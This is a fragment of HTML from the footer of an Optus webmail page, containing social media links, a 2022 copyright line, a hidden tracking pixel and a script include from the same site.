<li><a href="https://www.linkedin.com/company/optus" target="_blank" alt="Link to LinkedIn"><span class="ico ico-only ico-footer-social ico-linkedin">&nbsp;</span></a></li>

<li><a href="https://plus.google.com/+optus/posts" target="_blank" alt="Link to Google Plus"><span class="ico ico-only ico-footer-social ico-googleplus">&nbsp;</span></a></li>

<li><a href="https://www.pinterest.com/optus" target="_blank" alt="Link to Pinterest"><span class="ico ico-only ico-footer-social ico-pinterest">&nbsp;</span></a></li>

<li><a href="https://instagram.com/optusofficial" target="_blank" alt="Link to Instagram"><span class="ico ico-only ico-footer-social ico-instagram ico-instagram-bg">&nbsp;</span></a></li>
</ul>
</div>
</div>

<div class="columns medium-5 medium-pull-7 large-12 large-push-0">
<div class="footer-info"><span class="copyright">©2022 Singtel Optus Pty Limited</span></div>
</div>
</div>
</div>
</div>
</div>


</div>

</footer>

    </div>
    <!-- END footer -->



   

<noscript><img src="https://webmail.optusnet.com.au/akam/13/pixel_18ae682f?a=dD1kZGI0NWNhYmZlYjUwMGU1NzY4MTFhNDk1MmQ5YjQ2MzY5ZTQyOGE5JmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript><script type="text/javascript" src="css/FhBwcEk"></script>

</body></html>